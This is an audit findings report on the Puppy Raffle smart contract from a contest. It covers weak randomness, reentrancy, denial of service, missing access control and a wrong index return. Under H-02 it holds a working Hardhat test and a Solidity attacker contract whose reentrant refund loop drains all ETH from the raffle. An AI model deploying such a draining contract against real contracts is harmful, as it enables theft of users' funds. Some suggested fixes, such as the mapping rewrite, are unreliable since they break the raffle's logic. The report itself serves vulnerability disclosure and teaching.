# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. generating a random number on-chain - randomness vulnerability](#H-01)
    - ### [H-02. Effects should be before interactions - reentrancy vulnerability](#H-02)
- ## Medium Risk Findings
    - ### [M-01. duplicate entrants loop check - DOS vulnerability](#M-01)
    - ### [M-02. function selectWinner() and withdrawFees() don't have onlyOwner modifier - Access control vulnerability](#M-02)
- ## Low Risk Findings
    - ### [L-01. getActivePlayerIndex returns 0 - incorrect player index will be returned](#L-01)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 2
   - Low: 1


# High Risk Findings

## <a id='H-01'></a>H-01. generating a random number on-chain - randomness vulnerability            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L128

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L139

## Summary

Anyone is able to get the needed index

## Vulnerability Details

A malicious actor can copy the lines that calculate random numbers, and get the index they need, and call the selectWinner function when they need to become a winner

## Impact

Anyone could cheat and win all raffles 

## Tools Used

hardhat

## Recommendations

For generating a random number use off-chain oracles or services specifically for this
## <a id='H-02'></a>H-02. Effects should be before interactions - reentrancy vulnerability            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L101-L103

## Summary

The function is vulnerable to the reentrancy attack. All the assets will be stolen.

## Vulnerability Details

there is a pattern that every developer should follow - checks => effects => interactions. Otherwise the code might become vulnerable

## Impact

Anyone by using a malicious smart contract can attack the function and steal all the assets.
Here's the proof test:

```javascript
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { PuppyRaffle } from '../typechain-types';

const { provider, deployContract, getSigners, Wallet, parseEther, formatEther } = ethers;

let puppyRaffle: PuppyRaffle;

let initialPuppyRaffleBalance: number, initialAttackerBalance: number;

describe('puppyRaffle', function () {
	it('We steal all the assets', async () => {
		const [deployer, attacker] = await getSigners();

		puppyRaffle = await deployContract('PuppyRaffle', [parseEther('1'), deployer.address, 1000 * 60 * 60 * 24]);

		// 20 players enter the ruffle
		for (let i = 0; i < 20; i++) {
			const aUser = Wallet.createRandom().connect(provider);
			await provider.send('hardhat_setBalance', [
				aUser.address,
				'0xF43FC2C04EE0000', // 1.1 ETH
			]);

			await puppyRaffle.connect(aUser).enterRaffle([aUser.address], { value: parseEther('1') });
		}

		initialPuppyRaffleBalance = +formatEther(await provider.getBalance(puppyRaffle.target));
		initialAttackerBalance = +formatEther(await provider.getBalance(attacker.address));

		const attackerContract = await deployContract('PuppyRaffleAttacker', [puppyRaffle.target], attacker);

		await attacker.sendTransaction({
			to: attackerContract.target,
			value: parseEther('1'),
		});
		await attackerContract.attack();

		// we have all the assets
		expect(+formatEther(await provider.getBalance(attacker.address))).is.gt(initialAttackerBalance + 20 - 0.1);
		// puppyRaffle has none, bye-bye puppies lol
		expect(await provider.getBalance(puppyRaffle.target)).equals(0);
	});
});

```
And the attacker contract code:
```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

interface IPuppyRaffle {
	function refund(uint256 playerIndex) external;

	function enterRaffle(address[] memory newPlayers) external payable;

	function getActivePlayerIndex(address player) external view returns (uint256);
}

contract PuppyRaffleAttacker is Ownable {
	IPuppyRaffle puppyRaffle;

	constructor(address _puppyRaffle) {
		puppyRaffle = IPuppyRaffle(_puppyRaffle);
	}

	function attack() external onlyOwner {
		address[] memory players = new address[](1);
		players[0] = address(this);

		puppyRaffle.enterRaffle{ value: 1 ether }(players);
		puppyRaffle.refund(20);

		(bool sent, ) = owner().call{ value: address(this).balance }("");
		require(sent, "Failed to send ETH to the owner");
	}

	receive() external payable {
		if (msg.sender == address(puppyRaffle)) {
			while (address(puppyRaffle).balance >= 1 ether) {
				puppyRaffle.refund(20);
			}
		}
	}
}
```
## Tools Used

hardhat 

## Recommendations
These 2 lines need to change places 

```diff
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }


function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       payable(msg.sender).sendValue(entranceFee);

        emit RaffleRefunded(playerAddress);
```
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. duplicate entrants loop check - DOS vulnerability            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L86-L90

## Summary

If the players array will become big enough so the gas limit is not enough to calculate the tx, - it will be reverted. That would mean a denial of service, no one will be able to use the contract any more!

## Vulnerability Details

Each opcode in EVM requires gas to process calculations. The gas limit is 30mil for a tx, so if the calculations will demand more, the tx will be reverted. So when there will be "too much" players, the contract will become unreachable forever...

## Impact

The contract won't be available any more, so all the assets will be lost

## Tools Used

hardhat

## Recommendations

Instead of the array, developers need to use a mapping to store current players, it will make everything much easier

```diff
- address[] public players;

function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
-       for (uint256 i = 0; i < newPlayers.length; i++) {
-           players.push(newPlayers[i]);
-       }

        // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-          for (uint256 j = i + 1; j < players.length; j++) {
-              require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

+ mapping(address => bool) public players;

function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+            if(!players[newPlayers[i]]){ 
+              players[newPlayers[i]] = true;
+          }
+       }

        emit RaffleEnter(newPlayers);
    }

```
## <a id='M-02'></a>M-02. function selectWinner() and withdrawFees() don't have onlyOwner modifier - Access control vulnerability            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L125C39-L126C1

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L157

## Summary
The selectWinner() function should have onlyOnwer modifier

## Vulnerability Details

Only owner should be able to select a winner otherwise it seems illogical and also opens the door to the <b>randomness vulnerability</b>

## Impact

Anyone can call the selectWinner() function, which is not what you'd like to happen

## Tools Used

hardhat
## Recommendations

```diff
-function selectWinner() external {
+function selectWinner() external onlyOwner{
```

# Low Risk Findings

## <a id='L-01'></a>L-01. getActivePlayerIndex returns 0 - incorrect player index will be returned            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L116

## Summary

the function should not return 0 if no player is found, cause it's the index of the first player

## Vulnerability Details


index 0 is the first element of the players array, not a falsy return

## Impact

if the function is called and a player doesn't exist, it will return the 1st player, instead of saying that the player doesn't exist

## Tools Used

hardhat

## Recommendations

the function should revert tx or return false for example and then revert. But the much better way is to use a mapping for players, it would make thing much more cleaner and cheaper and better in all senses

```diff
 function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }

-       return 0;
    }

function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }

+       revert('Player not found');
    }
```


